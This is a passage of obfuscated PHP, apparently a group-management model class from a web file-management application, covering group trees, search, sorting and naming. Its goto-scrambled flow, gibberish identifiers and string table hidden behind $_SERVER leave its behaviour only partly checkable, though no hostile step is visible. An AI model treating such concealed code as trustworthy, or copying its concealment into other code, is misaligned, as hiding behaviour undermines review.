array($c·Æ‹İë¢ö[548] => array($c·Æ‹İë¢ö[556], "\162\x65\x70\x6c\141\x63\145\x28\160\x61\162\x65\x6e\x74\x4c\x65\166\x65\154\54\47{$c»ÛÙƒÖ™±}\47\x2c\47{$DÎ¥‚£ƒÀø}\47\51")); goto c÷„ÇàÓƒø; c÷„ÇàÓƒø: $this->_clearChildrenCache($BÌ ì…ğ); $this->where($e§éõĞ³»Ó)->data($dæè³Ç)->save(); goto D…‘ˆˆ¥­; EÃƒ¤…°åñ: $c·Æ‹İë¢ö =& $_SERVER[µ…]; $c»ÛÙƒÖ™± = $BÌ ì…ğ[$c·Æ‹İë¢ö[481]] . $BÌ ì…ğ[$c·Æ‹İë¢ö[1669]] . $c·Æ‹İë¢ö[47]; $DÎ¥‚£ƒÀø = $fà¸—÷óá[$c·Æ‹İë¢ö[481]] . $fà¸—÷óá[$c·Æ‹İë¢ö[1669]] . $c·Æ‹İë¢ö[47] . $BÌ ì…ğ[$c·Æ‹İë¢ö[1669]] . $c·Æ‹İë¢ö[47]; goto eŸ¸ÆƒÃ„ò; D…‘ˆˆ¥­: } public function setNamePinyin($BÙ¯’©óÇ†, $aæ¸ã¬’ïß = false) { $eÕ®Ó¼–Öƒ =& $_SERVER[µ…]; if (!$aæ¸ã¬’ïß) { $e×êö ¹³„ = $this->getInfoSimple($BÙ¯’©óÇ†); $aæ¸ã¬’ïß = $e×êö ¹³„[$eÕ®Ó¼–Öƒ[28]]; } if (!Input::check($aæ¸ã¬’ïß, $eÕ®Ó¼–Öƒ[551])) { $this->metaSet($BÙ¯’©óÇ†, $eÕ®Ó¼–Öƒ[438], null); $this->metaSet($BÙ¯’©óÇ†, $eÕ®Ó¼–Öƒ[437], null); return; } $c‰àŞîÜ½ = array($eÕ®Ó¼–Öƒ[438] => str_replace($eÕ®Ó¼–Öƒ[50], $eÕ®Ó¼–Öƒ[33], Pinyin::encode($aæ¸ã¬’ïß)), $eÕ®Ó¼–Öƒ[437] => Pinyin::encode($aæ¸ã¬’ïß, $eÕ®Ó¼–Öƒ[552])); $this->metaSet($BÙ¯’©óÇ†, $c‰àŞîÜ½); } protected function groupStatus($AåºÑŞËâ, $a¶ÏíÅòÎ) { goto EÀ™…™‹»; EÀ™…™‹»: $DÌ·Ğã¶—‹ =& $_SERVER[µ…]; $aãÁ…Âï·Ä = $this->getInfoSimple($AåºÑŞËâ); if (!$aãÁ…Âï·Ä) { return !1; } goto BòŸ¼Ÿ¼; B³ÚŞ´ÙØÎ: foreach ($FŠ¯™íãŞ  as $AåºÑŞËâ) { $f×‘Š£Áê[] = array($DÌ·Ğã¶—‹[1669] => $AåºÑŞËâ, $DÌ·Ğã¶—‹[92] => $DÌ·Ğã¶—‹[704], $DÌ·Ğã¶—‹[370] => $a¶ÏíÅòÎ); } return Model($DÌ·Ğã¶—‹[1750])->addAll($f×‘Š£Áê, array(), !0); goto fªØë‰Õ«; BòŸ¼Ÿ¼: if ($a¶ÏíÅòÎ == $DÌ·Ğã¶—‹[86]) { $FŠ¯™íãŞ  = $this->parentLevelArray($aãÁ…Âï·Ä[$DÌ·Ğã¶—‹[481]]); } else { $E¶Ã—Òª“ = array($DÌ·Ğã¶—‹[548] => array($DÌ·Ğã¶—‹[507], $aãÁ…Âï·Ä[$DÌ·Ğã¶—‹[481]] . $aãÁ…Âï·Ä[$DÌ·Ğã¶—‹[1669]] . $DÌ·Ğã¶—‹[508])); $FŠ¯™íãŞ  = $this->where($E¶Ã—Òª“)->field($DÌ·Ğã¶—‹[1669])->select(); $FŠ¯™íãŞ  = array_to_keyvalue($FŠ¯™íãŞ , $DÌ·Ğã¶—‹[33], $DÌ·Ğã¶—‹[1669]); } $FŠ¯™íãŞ [] = $aãÁ…Âï·Ä[$DÌ·Ğã¶—‹[1669]]; $f×‘Š£Áê = array(); goto B³ÚŞ´ÙØÎ; fªØë‰Õ«: } protected function groupRemove($B„àßÄ¼ß†) { goto d„¹Õ»šÔÙ; dÛØ½¾¶ÜØ: Model($F·ç‚ÜËö™[769])->groupRootRemove($B„àßÄ¼ß†); return $this->where($aÇ™ÏØäÖ˜)->delete(); goto FÓ¹·Í ğ; d„¹Õ»šÔÙ: $F·ç‚ÜËö™ =& $_SERVER[µ…]; $aÇ™ÏØäÖ˜ = array($F·ç‚ÜËö™[1669] => $B„àßÄ¼ß†); $cÉ¶òÏÙôË = $this->where($aÇ™ÏØäÖ˜)->find(); goto B¹Öï‰áò¾; B¹Öï‰áò¾: if (!$cÉ¶òÏÙôË || $cÉ¶òÏÙôË[$F·ç‚ÜËö™[472]] == 0) { return !1; } $b©¨±³‚‹É = $this->getInfoSimple($cÉ¶òÏÙôË[$F·ç‚ÜËö™[472]]); $this->_changeChildLevel($cÉ¶òÏÙôË, $b©¨±³‚‹É, !0); goto bè¥îøß»; bè¥îøß»: $this->where(array($F·ç‚ÜËö™[472] => $B„àßÄ¼ß†))->save(array($F·ç‚ÜËö™[472] => $cÉ¶òÏÙôË[$F·ç‚ÜËö™[472]])); Model($F·ç‚ÜËö™[1750])->where($aÇ™ÏØäÖ˜)->delete(); Model($F·ç‚ÜËö™[1751])->where($aÇ™ÏØäÖ˜)->delete(); goto dÛØ½¾¶ÜØ; FÓ¹·Í ğ: } protected function groupSort($Fö¬¦ˆå) { $B–Šå…±ŞÜ =& $_SERVER[µ…]; $E‹†í×çÙ• = array(); foreach ($Fö¬¦ˆå as $DØÓàõÉµî => $BçÎ¥¦òºË) { $E‹†í×çÙ•[] = array($B–Šå…±ŞÜ[1669], $BçÎ¥¦òºË, $B–Šå…±ŞÜ[1692], $DØÓàõÉµî + 1); } $this->saveAll($E‹†í×çÙ•); } public function listData() { $D’©¦æ·Ìù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D’©¦æ·Ìù[$_SERVER[µ…][365]]); return $D’©¦æ·Ìù; } private function _makeOrder($FöÙĞøñ²œ = '') { goto dºÅ‰Ï¯‹; bƒ«˜Ï ‰: $FöÙĞøñ²œ = $FöÙĞøñ²œ . "{$a¢…˜‡«†­}\40{$c´£çèŞØ‘}\x2c\x20\x67\162\x6f\165\x70\111\x44\x20\141\x73\x63"; return $this->order($FöÙĞøñ²œ); goto eŠ£…œõĞ; dİ¬õÊ½ô: $a¢…˜‡«†­ = Input::get($F‚ÏóÒ¨æš[429], $F‚ÏóÒ¨æš[7], $F‚ÏóÒ¨æš[1673], $A¶±„¡à‚š); $c´£çèŞØ‘ = Input::get($F‚ÏóÒ¨æš[430], $F‚ÏóÒ¨æš[7], $F‚ÏóÒ¨æš[1752], array($F‚ÏóÒ¨æš[1752], $F‚ÏóÒ¨æš[424])); $c´£çèŞØ‘ = $b‰ß–‰Œö[$c´£çèŞØ‘]; goto bƒ«˜Ï ‰; dºÅ‰Ï¯‹: $F‚ÏóÒ¨æš =& $_SERVER[µ…]; $A¶±„¡à‚š = array($F‚ÏóÒ¨æš[1669], $F‚ÏóÒ¨æš[28], $F‚ÏóÒ¨æš[1655], $F‚ÏóÒ¨æš[192]); $b‰ß–‰Œö = array($F‚ÏóÒ¨æš[422] => $F‚ÏóÒ¨æš[423], $F‚ÏóÒ¨æš[424] => $F‚ÏóÒ¨æš[425]); goto dİ¬õÊ½ô; eŠ£…œõĞ: } public function listChild($b»ºí³ß‚) { $fİÇØ…íÀÊ =& $_SERVER[µ…]; $fğñàœØ² = $this->where(array($fİÇØ…íÀÊ[472] => $b»ºí³ß‚))->_makeOrder()->selectPage(200); $this->_listDataApply($fğñàœØ²[$fİÇØ…íÀÊ[365]]); return $fğñàœØ²; } public function listByID($b©ÛêĞ–ÁË) { $a¼Í‘”‡ï =& $_SERVER[µ…]; if (!$b©ÛêĞ–ÁË) { return array(); } $C×ğÆâÅ†Æ = array($a¼Í‘”‡ï[1669] => array($a¼Í‘”‡ï[7], $b©ÛêĞ–ÁË)); $FÏØ´è×Ú = $this->where($C×ğÆâÅ†Æ)->select(); $this->_listDataApply($FÏØ´è×Ú); return $FÏØ´è×Ú; } public function listSearch($CëÔ„±‚»í) { goto E¯è·ç·Œ¾; E©¯‚Ù¬: if ($C´Î¡ã¸ ×) { $EÛ™ëÀ¢õÃ = $this->getInfoSimple($C´Î¡ã¸ ×); $fÆ½ğÕ˜Ë½ = $EÛ™ëÀ¢õÃ[$D÷÷£´ ·½[481]] . $C´Î¡ã¸ × . $D÷÷£´ ·½[508]; $c¥Ó°®„ ˆ = array($c¥Ó°®„ ˆ, array($D÷÷£´ ·½[481] => array($D÷÷£´ ·½[378], $fÆ½ğÕ˜Ë½))); } $c¥Ó°®„ ˆ = $this->parseWhereLike($c¥Ó°®„ ˆ); $AÌÇ‚Ö  = $this->_makeOrder()->where($c¥Ó°®„ ˆ)->selectPage(20); goto bîÆ‰¾Ÿ¶©; E¯è·ç·Œ¾: $D÷÷£´ ·½ =& $_SERVER[µ…]; $bÚê«×Á‚¼ = $CëÔ„±‚»í[$D÷÷£´ ·½[1753]]; $C´Î¡ã¸ × = isset($CëÔ„±‚»í[$D÷÷£´ ·½[1754]]) ? $CëÔ„±‚»í[$D÷÷£´ ·½[1754]] : !1; goto EÌ»‘Şœ°«; CÜèñáƒñõ: return $AÌÇ‚Ö ; goto b´åƒ—Ã÷š; bîÆ‰¾Ÿ¶©: $AÌÇ‚Ö  = $AÌÇ‚Ö  ? $AÌÇ‚Ö  : array(); if (!$AÌÇ‚Ö  || count($AÌÇ‚Ö [$D÷÷£´ ·½[365]]) < 5 && Input::check($bÚê«×Á‚¼, $D÷÷£´ ·½[314])) { goto b»É„Ï‡³“; F‡‹–›«˜ß: $AÌÇ‚Ö [$D÷÷£´ ·½[362]][$D÷÷£´ ·½[364]] = ceil($AÌÇ‚Ö [$D÷÷£´ ·½[362]][$D÷÷£´ ·½[363]] / $AÌÇ‚Ö [$D÷÷£´ ·½[362]][$D÷÷£´ ·½[359]]); goto cÎÚà˜ŞÚØ; cÎ©‚…¹¢: $d¡ ”é«ää = array_merge($dç±æ—Ëã×, $d­–»‘ö¬‘, $AÌÇ‚Ö [$D÷÷£´ ·½[365]]); $AÌÇ‚Ö [$D÷÷£´ ·½[365]] = array_unique_by_key($d¡ ”é«ää, $D÷÷£´ ·½[1669]); $AÌÇ‚Ö [$D÷÷£´ ·½[362]][$D÷÷£´ ·½[363]] = count($AÌÇ‚Ö [$D÷÷£´ ·½[365]]); goto F‡‹–›«˜ß; b»É„Ï‡³“: $aóâà½Â = $this->groupChildrenAll($C´Î¡ã¸ ×); $dç±æ—Ëã× = $this->_searchFromMeta($D÷÷£´ ·½[437], $bÚê«×Á‚¼, 10, $aóâà½Â); $d­–»‘ö¬‘ = $this->_searchFromMeta($D÷÷£´ ·½[438], $bÚê«×Á‚¼, 10, $aóâà½Â); goto cÎ©‚…¹¢; cÎÚà˜ŞÚØ: } $this->_listDataApply($AÌÇ‚Ö [$D÷÷£´ ·½[365]]); goto CÜèñáƒñõ; EÌ»‘Şœ°«: if (!trim($bÚê«×Á‚¼)) { return !1; } $bÚê«×Á‚¼ = str_replace($D÷÷£´ ·½[1755], $D÷÷£´ ·½[1756], $bÚê«×Á‚¼); $c¥Ó°®„ ˆ = array($D÷÷£´ ·½[1669] => array($D÷÷£´ ·½[378], "{$bÚê«×Á‚¼}\x25"), $D÷÷£´ ·½[28] => array($D÷÷£´ ·½[378], "\45{$bÚê«×Á‚¼}\45"), $D÷÷£´ ·½[935] => $D÷÷£´ ·½[1757]); goto E©¯‚Ù¬; b´åƒ—Ã÷š: } protected function groupChildrenAll($Fê½ˆ·áÎè) { $f©Ù³ŸÒ³‰ =& $_SERVER[µ…]; if (!$Fê½ˆ·áÎè) { return !1; } if (is_string($Fê½ˆ·áÎè)) { $Fê½ˆ·áÎè = array($Fê½ˆ·áÎè); } $e½¬Ìß¸‰ò = $Fê½ˆ·áÎè; foreach ($Fê½ˆ·áÎè as $e‚ñŞÄ‹æ) { $aœ¯Ñƒ¿¬Ø = $this->getInfoSimple($e‚ñŞÄ‹æ); $Eã™µéê¸ = array($f©Ù³ŸÒ³‰[481] => array($f©Ù³ŸÒ³‰[378], $aœ¯Ñƒ¿¬Ø[$f©Ù³ŸÒ³‰[481]] . $e‚ñŞÄ‹æ . $f©Ù³ŸÒ³‰[508])); $EÔ¶â¨¸¸ = $this->field($f©Ù³ŸÒ³‰[1669])->where($Eã™µéê¸)->select(); $e½¬Ìß¸‰ò = array_merge($e½¬Ìß¸‰ò, array_to_keyvalue($EÔ¶â¨¸¸, $f©Ù³ŸÒ³‰[33], $f©Ù³ŸÒ³‰[1669])); } return array_unique($e½¬Ìß¸‰ò); } private function _searchFromMeta($cêœôŠ“Ù, $b¹Ì¦èÇ©°, $dĞÄå³Å, $EáŸ¦Üù¤Ñ) { goto AñÀ½†»§; AñÀ½†»§: $d—¦…¢ˆ» =& $_SERVER[µ…]; $b¹Ì¦èÇ©° = strtolower($b¹Ì¦èÇ©°); $Aïâøóñ‹» = array($d—¦…¢ˆ»[92] => $cêœôŠ“Ù, $d—¦…¢ˆ»[370] => array($d—¦…¢ˆ»[378], "\45{$b¹Ì¦èÇ©°}\x25")); goto döÍÒ¶„ù¬; döÍÒ¶„ù¬: $Aïâøóñ‹» = $this->parseWhereLike($Aïâøóñ‹»); if ($EáŸ¦Üù¤Ñ) { $Aïâøóñ‹»[$d—¦…¢ˆ»[1669]] = array($d—¦…¢ˆ»[7], $EáŸ¦Üù¤Ñ); } $cÑ£Œ“Œ = Model($d—¦…¢ˆ»[1758])->where($Aïâøóñ‹»)->limit($dĞÄå³Å)->select(); goto Eïˆˆ†ˆÍ„; A¨í¤Şë: if (!$Aƒ£¬Ù¿¿­) { return array(); } return $Aƒ£¬Ù¿¿­; goto B¶Ôª„¶İ“; Eïˆˆ†ˆÍ„: if (!$cÑ£Œ“Œ) { return array(); } $cÑ£Œ“Œ = array_to_keyvalue($cÑ£Œ“Œ, $d—¦…¢ˆ»[33], $d—¦…¢ˆ»[1669]); $Aƒ£¬Ù¿¿­ = $this->where(array($d—¦…¢ˆ»[1748] => array($d—¦…¢ˆ»[7], $cÑ£Œ“Œ)))->select(); goto A¨í¤Şë; B¶Ôª„¶İ“: } protected function _listDataApplyItem($DŠ²»Öæ…‹) { $DœĞ¬…¯Ñä = array($DŠ²»Öæ…‹); $this->_listDataApply($DœĞ¬…¯Ñä); return $DœĞ¬…¯Ñä[0]; } protected function _listDataApply(&$a‰øå¨‘) { goto B‡¨¿¨Éò…; B‡¨¿¨Éò…: $d¿Ø¬–—¿ =& $_SERVER[µ…]; if (!$a‰øå¨‘) { return; } $BŒËïÏ¹ë = array_to_keyvalue($a‰øå¨‘, $d¿Ø¬–—¿[33], $d¿Ø¬–—¿[1669]); goto CøÀÚ§“ˆé; CøÀÚ§“ˆé: $this->_listAppendChildren($a‰øå¨‘); $this->_listAppendChildrenMember($a‰øå¨‘); $this->_listAppendMeta($a‰øå¨‘, $BŒËïÏ¹ë); goto B¯·¾‰„™ø; B¯·¾‰„™ø: $this->_listAppendParent($a‰øå¨‘); $this->_listAppendSourceRoot($a‰øå¨‘, $BŒËïÏ¹ë); goto A¡…šñ»; A¡…šñ»: } private function _listAppendChildren(&$e£œ‡õÜ”Ã) { goto bË¢°Ë¿ëé; E³â·ë…ä: $A¥í§Ç§ô = array($BÆ¶ÄïØÏ±[472], $BÆ¶ÄïØÏ±[1759] => $BÆ¶ÄïØÏ±[474]); $eÇƒ°²‰ƒ = $this->field($A¥í§Ç§ô)->where($a„¥ÎâŸ)->group($BÆ¶ÄïØÏ±[472])->select(); $C¬ÚîöÂè§ = array_to_keyvalue($eÇƒ°²‰ƒ, $BÆ¶ÄïØÏ±[472], $BÆ¶ÄïØÏ±[474]); goto Cùç¼ºŞåí; Cùç¼ºŞåí: foreach ($e£œ‡õÜ”Ã as &$b„õöÕæ†) { $e¡ÛŸíÍ½è = $b„õöÕæ†[$BÆ¶ÄïØÏ±[1669]]; $b„õöÕæ†[$BÆ¶ÄïØÏ±[1760]] = isset($C¬ÚîöÂè§[$e¡ÛŸíÍ½è]) ? intval($C¬ÚîöÂè§[$e¡ÛŸíÍ½è]) : !1; } unset($b„õöÕæ†); goto b»ë©­Æ†©; bË¢°Ë¿ëé: $BÆ¶ÄïØÏ± =& $_SERVER[µ…]; $EË£Şó¯Ü = array_to_keyvalue($e£œ‡õÜ”Ã, $BÆ¶ÄïØÏ±[33], $BÆ¶ÄïØÏ±[1669]); $a„¥ÎâŸ = array($BÆ¶ÄïØÏ±[472] => array($BÆ¶ÄïØÏ±[7], $EË£Şó¯Ü)); goto E³â·ë…ä; b»ë©­Æ†©: } private function _listAppendChildrenMember(&$D‡‹Ğ³ º) { goto f™˜İÇù; B´¢¿â¯¸¨: foreach ($D‡‹Ğ³ º as &$fÚÈ¦ß‡ã) { $a”âî°…ù± = $fÚÈ¦ß‡ã[$bŞò°ÅÂÎ[1669]]; $fÚÈ¦ß‡ã[$bŞò°ÅÂÎ[1761]] = isset($A›„Ìµ°óÚ[$a”âî°…ù±]) ? intval($A›„Ìµ°óÚ[$a”âî°…ù±]) : !1; } unset($fÚÈ¦ß‡ã); goto A°³‘ò‚¶Ó; f™˜İÇù: $bŞò°ÅÂÎ =& $_SERVER[µ…]; $f™ÃµÖ®÷À = array_to_keyvalue($D‡‹Ğ³ º, $bŞò°ÅÂÎ[33], $bŞò°ÅÂÎ[1669]); $FËÄÁ½°ÓŸ = array($bŞò°ÅÂÎ[1669] => array($bŞò°ÅÂÎ[7], $f™ÃµÖ®÷À)); goto C¾’êÕ²¯Ó; C¾’êÕ²¯Ó: $EË¢øó¯„Ê = array($bŞò°ÅÂÎ[1669], $bŞò°ÅÂÎ[1759] => $bŞò°ÅÂÎ[474]); $Då…¢îù­‰ = Model($bŞò°ÅÂÎ[1751])->field($EË¢øó¯„Ê)->where($FËÄÁ½°ÓŸ)->group($bŞò°ÅÂÎ[1669])->select(); $A›„Ìµ°óÚ = array_to_keyvalue($Då…¢îù­‰, $bŞò°ÅÂÎ[1669], $bŞò°ÅÂÎ[474]); goto B´¢¿â¯¸¨; A°³‘ò‚¶Ó: } private function _listAppendMeta(&$B·êŞ…ÎãŠ, $c†é¦Œõéí) { goto bğ¸ » ‡•; bğ¸ » ‡•: $b†„æ¨’Æ =& $_SERVER[µ…]; $eŞŞà£Õ™“ = array($b†„æ¨’Æ[1669] => array($b†„æ¨’Æ[7], $c†é¦Œõéí)); $D–“×øÛ…™ = Model($b†„æ¨’Æ[1750])->where($eŞŞà£Õ™“)->select(); goto f¨ìàßà•; f¨ìàßà•: $D–“×øÛ…™ = array_to_keyvalue_group($D–“×øÛ…™, $b†„æ¨’Æ[1669]); foreach ($D–“×øÛ…™ as &$Aêô»‘Ç´) { $Aêô»‘Ç´ = array_to_keyvalue($Aêô»‘Ç´, $b†„æ¨’Æ[92], $b†„æ¨’Æ[370]); } unset($Aêô»‘Ç´); goto DßÜåÔ¨Î˜; DßÜåÔ¨Î˜: foreach ($B·êŞ…ÎãŠ as &$Fš½©¢ƒ¹ ) { $Fš½©¢ƒ¹ [$b†„æ¨’Æ[439]] = array(); if (isset($D–“×øÛ…™[$Fš½©¢ƒ¹ [$b†„æ¨’Æ[1669]]])) { $Fš½©¢ƒ¹ [$b†„æ¨’Æ[439]] = $D–“×øÛ…™[$Fš½©¢ƒ¹ [$b†„æ¨’Æ[1669]]]; } } unset($Fš½©¢ƒ¹ ); goto bç‹»Ì¿õ‹; bç‹»Ì¿õ‹: } protected function parentLevelArray($B³¢Ê•¡Ä©) { $c¹ƒÏ‹ˆê =& $_SERVER[µ…]; $B³¢Ê•¡Ä© = explode($c¹ƒÏ‹ˆê[47], trim($B³¢Ê•¡Ä©, $c¹ƒÏ‹ˆê[47])); $B³¢Ê•¡Ä© = array_remove_value($B³¢Ê•¡Ä©, $c¹ƒÏ‹ˆê[491]); return $B³¢Ê•¡Ä©; } private function _listAppendParent(&$bìµíÙˆ‘) { goto Bä¾ÔóÈÜ¦; f«ìí´õŒ: if ($GLOBALS[$eâ§Äòè²[479]] == $eâ§Äòè²[86]) { $eçŠ›¼íÅ‚ = !1; } foreach ($bìµíÙˆ‘ as &$b¿š¢ÆÌö¤) { $CØÄ²œÓµ¯ = $this->parentLevelArray($b¿š¢ÆÌö¤[$eâ§Äòè²[481]]); $D¶©Í¬´´å = $eâ§Äòè²[33]; foreach ($CØÄ²œÓµ¯ as $dÉ“òñ±Û => $b•¼›âŠÑÈ) { if ($eçŠ›¼íÅ‚ && $dÉ“òñ±Û == 0) { continue; } $D¶©Í¬´´å .= $E¡×ÚŸÍ·[$b•¼›âŠÑÈ] . $eâ§Äòè²[8]; } if ($CØÄ²œÓµ¯) { $D¶©Í¬´´å .= $b¿š¢ÆÌö¤[$eâ§Äòè²[28]]; } $b¿š¢ÆÌö¤[$eâ§Äòè²[485]] = str_replace($eâ§Äòè²[490], $eâ§Äòè²[8], $D¶©Í¬´´å); } unset($b¿š¢ÆÌö¤); goto dã´½¼ãƒ; cÂÜ˜˜âá§: unset($b¿š¢ÆÌö¤); foreach ($E¡×ÚŸÍ· as $dÉ“òñ±Û => $cêê‡Ö¿Ä­) { if ($cêê‡Ö¿Ä­) { continue; } $DÇ¿ß†¶Á = $this->getInfoSimple($dÉ“òñ±Û); $E¡×ÚŸÍ·[$dÉ“òñ±Û] = $DÇ¿ß†¶Á[$eâ§Äòè²[28]]; } $eçŠ›¼íÅ‚ = $GLOBALS[$eâ§Äòè²[6]][$eâ§Äòè²[87]][$eâ§Äòè²[1762]]; goto f«ìí´õŒ; Bä¾ÔóÈÜ¦: $eâ§Äòè² =& $_SERVER[µ…]; $E¡×ÚŸÍ· = array(); foreach ($bìµíÙˆ‘ as &$b¿š¢ÆÌö¤) { $E¡×ÚŸÍ·[$b¿š¢ÆÌö¤[$eâ§Äòè²[1669]]] = $b¿š¢ÆÌö¤[$eâ§Äòè²[28]]; $CØÄ²œÓµ¯ = $this->parentLevelArray($b¿š¢ÆÌö¤[$eâ§Äòè²[481]]); foreach ($CØÄ²œÓµ¯ as $b•¼›âŠÑÈ) { if (!isset($E¡×ÚŸÍ·[$b•¼›âŠÑÈ])) { $E¡×ÚŸÍ·[$b•¼›âŠÑÈ] = 0; } } } goto cÂÜ˜˜âá§; dã´½¼ãƒ: } private function _listAppendSourceRoot(&$Aˆ‘–ùŠ›, $C×˜¨µ™ò‹) { goto eøÃÂè¼²‘; eøÃÂè¼²‘: $F˜â­†íÕ¡ =& $_SERVER[µ…]; $Cœ©°É˜ˆä = array($F˜â­†íÕ¡[398] => SourceModel::TYPE_GROUP, $F˜â­†íÕ¡[472] => 0, $F˜â­†íÕ¡[478] => array($F˜â­†íÕ¡[7], $C×˜¨µ™ò‹)); $c”ÒÙîÄœï = $F˜â­†íÕ¡[1763]; goto dÄ­¡Èº¼; dÇ°°›‰Œ: foreach ($Aˆ‘–ùŠ› as &$f÷´á£Ü¿¢) { $f÷´á£Ü¿¢[$F˜â­†íÕ¡[84]] = $DåÙÎŒË[$f÷´á£Ü¿¢[$F˜â­†íÕ¡[1669]]] ? $DåÙÎŒË[$f÷´á£Ü¿¢[$F˜â­†íÕ¡[1669]]] : array(); } unset($f÷´á£Ü¿¢); goto cŒù‘„Ó¹İ; dÄ­¡Èº¼: $DåÙÎŒË = Model($F˜â­†íÕ¡[769])->order($F˜â­†íÕ¡[1764])->field($c”ÒÙîÄœï)->where($Cœ©°É˜ˆä)->select(); $DåÙÎŒË = array_to_keyvalue($DåÙÎŒË, $F˜â­†íÕ¡[478]); $DåÙÎŒË = array_remove_key($DåÙÎŒË, $F˜â­†íÕ¡[478]); goto dÇ°°›‰Œ; cŒù‘„Ó¹İ: } protected function groupMerge($DËø÷ÇÈ‚±) { $DËø÷ÇÈ‚± = array_values(array_unique($DËø÷ÇÈ‚±)); $dá ‹µß› = array(); for ($bÅ‹‚ôøº§ = 0; $bÅ‹‚ôøº§ < count($DËø÷ÇÈ‚±); $bÅ‹‚ôøº§++) { $b¿×”•³Ş« = !1; for ($AòÊ¡­ïŞç = 0; $AòÊ¡­ïŞç < count($DËø÷ÇÈ‚±); $AòÊ¡­ïŞç++) { if ($bÅ‹‚ôøº§ == $AòÊ¡­ïŞç) { continue; } if ($this->isParentOf($DËø÷ÇÈ‚±[$AòÊ¡­ïŞç], $DËø÷ÇÈ‚±[$bÅ‹‚ôøº§])) { $b¿×”•³Ş« = !0; break; } } if (!$b¿×”•³Ş«) { $dá ‹µß›[] = $DËø÷ÇÈ‚±[$bÅ‹‚ôøº§]; } } return $dá ‹µß›; } protected function isParentOf($a±ÙÆ´‘ÁÌ, $bÎÑ®ÇÃã) { goto F‡é¾ó’´Ï; FÙ³É…Êùô: $dâŸƒì÷ = $this->getInfoSimple($bÎÑ®ÇÃã); $dë‡ø‰×Œ© = $CÌÕñößˆÏ[$eŸÈÒš§âé[481]] . $a±ÙÆ´‘ÁÌ . $eŸÈÒš§âé[47]; if (substr($dâŸƒì÷[$eŸÈÒš§âé[481]], 0, strlen($dë‡ø‰×Œ©)) == $dë‡ø‰×Œ©) { return !0; } goto b½ä°ì³ÈÕ; F‡é¾ó’´Ï: $eŸÈÒš§âé =& $_SERVER[µ…]; if (!$a±ÙÆ´‘ÁÌ || !$bÎÑ®ÇÃã || $a±ÙÆ´‘ÁÌ == $bÎÑ®ÇÃã) { return !1; } $CÌÕñößˆÏ = $this->getInfoSimple($a±ÙÆ´‘ÁÌ); goto FÙ³É…Êùô; b½ä°ì³ÈÕ: return !1; goto cî¢ÊÔÜÂ; cî¢ÊÔÜÂ: } public function groupShowRoot($bíÖõ è­Ú, $B’®’ì˜¸Ó = false) { goto fŠÔóÃÛ¼; aÒÃÌ¨íÊù: if ($B’®’ì˜¸Ó && count($cÙ»íÔÉ³®) == 1) { return $b—©™ÛİË; } if (!$cªŞ‰æ½ [$b¤ˆ¡‚ï«š[439]] || !isset($cªŞ‰æ½ [$b¤ˆ¡‚ï«š[439]][$b¤ˆ¡‚ï«š[1746]]) || $cªŞ‰æ½ [$b¤ˆ¡‚ï«š[439]][$b¤ˆ¡‚ï«š[1746]] == $b¤ˆ¡‚ï«š[1720]) { return $this->groupShowRoot($cÙ»íÔÉ³®[count($cÙ»íÔÉ³®) - 1], $B’®’ì˜¸Ó); } if ($cªŞ‰æ½ [$b¤ˆ¡‚ï«š[439]][$b¤ˆ¡‚ï«š[1746]] == $b¤ˆ¡‚ï«š[355]) { $EóÉØİ‡–ğ = explode($b¤ˆ¡‚ï«š[47], $cªŞ‰æ½ [$b¤ˆ¡‚ï«š[439]][$b¤ˆ¡‚ï«š[1747]]); if ($EóÉØİ‡–ğ) { $b—©™ÛİË = array_merge($b—©™ÛİË, $EóÉØİ‡–ğ); } } goto bôö¼¿Ñ¾; bôö¼¿Ñ¾: return $b—©™ÛİË; goto B‚„é—Ö®…; FÒ Å Ğ‚: $cÙ»íÔÉ³® = $this->parentLevelArray($cªŞ‰æ½ [$b¤ˆ¡‚ï«š[481]]); $b—©™ÛİË = array($bíÖõ è­Ú); if (count($cÙ»íÔÉ³®) == 0) { return $b—©™ÛİË; } goto aÒÃÌ¨íÊù; fŠÔóÃÛ¼: $b¤ˆ¡‚ï«š =& $_SERVER[µ…]; $cªŞ‰æ½  = $this->getInfo($bíÖõ è­Ú); if (!$cªŞ‰æ½ ) { return array(); } goto FÒ Å Ğ‚; B‚„é—Ö®…: } protected function resetParentLevel() { $d°Õ¢«é– =& $_SERVER[µ…]; $E’ç¼ÔåŞÌ = $d°Õ¢«é–[1669]; $Dáâ¦ßá‡™ = $this->select(); $Dáâ¦ßá‡™ = array_to_keyvalue($Dáâ¦ßá‡™, $E’ç¼ÔåŞÌ); foreach ($Dáâ¦ßá‡™ as $aÙªõŒ§Î¹) { goto e…Ò‚“öÃ; e…Ò‚“öÃ: $CØËî„Ãœ˜ = $aÙªõŒ§Î¹; $Cãğ¾‘–½› = array(); while ($CØËî„Ãœ˜[$d°Õ¢«é–[472]] != 0) { $Cãğ¾‘–½›[] = $CØËî„Ãœ˜[$d°Õ¢«é–[472]]; $CØËî„Ãœ˜ = $Dáâ¦ßá‡™[$CØËî„Ãœ˜[$d°Õ¢«é–[472]]]; } goto FŸº¡Ï‘«ß; FŸº¡Ï‘«ß: $Cãğ¾‘–½›[] = 0; $Cãğ¾‘–½› = $d°Õ¢«é–[47] . implode($d°Õ¢«é–[47], array_reverse($Cãğ¾‘–½›)) . $d°Õ¢«é–[47]; $this->setNamePinyin($aÙªõŒ§Î¹[$E’ç¼ÔåŞÌ], $aÙªõŒ§Î¹[$d°Õ¢«é–[28]]); goto fô˜¬§é‹ƒ; fô˜¬§é‹ƒ: $this->where(array($E’ç¼ÔåŞÌ => $aÙªõŒ§Î¹[$E’ç¼ÔåŞÌ]))->save(array($d°Õ¢«é–[548] => $Cãğ¾‘–½›)); goto a§Îç¡©; a§Îç¡©: } return $Dáâ¦ßá‡™; } public function groupNameAuto($c‹àâÉÎ…È, $F…ÒĞÊéÁö) { $Dß÷ö¡¼• =& $_SERVER[µ…]; $D»÷îÑµğ– = $this->where(array($Dß÷ö¡¼•[389] => $c‹àâÉÎ…È))->getField($Dß÷ö¡¼•[28], !0); if (!$D»÷îÑµğ– || !in_array($F…ÒĞÊéÁö, $D»÷îÑµğ–)) { return $F…ÒĞÊéÁö; } for ($A³½ñŒÖ¸ã = 1; $A³½ñŒÖ¸ã <= count($D»÷îÑµğ–) + 1; $A³½ñŒÖ¸ã++) { $a†Ä´«ãŞ = $F…ÒĞÊéÁö . "\x28{$A³½ñŒÖ¸ã}\x29"; if (!in_array($a†Ä´«ãŞ, $D»÷îÑµğ–)) { return $a†Ä´«ãŞ; } } } public function groupSwitch($F¾‡Œ¹ğ·Ç, 